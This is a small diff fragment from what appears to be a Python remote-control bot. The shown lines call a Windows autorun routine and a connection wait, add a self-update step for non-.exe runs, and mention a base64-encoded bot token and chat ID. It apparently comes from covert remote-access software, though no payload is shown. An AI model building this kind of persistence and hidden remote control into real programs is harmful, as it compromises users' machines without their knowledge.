@@ -283,7 +283,8 @@ def main():
         winntAutoRun()
     
     waitForConnection()
-    
+    if not sys.argv[0].endswith(".exe"):
+	autoupdate()
     chtid=wt=0
 
     basestr=""#Here must be bot TOKEN and ChatID encoded in base64
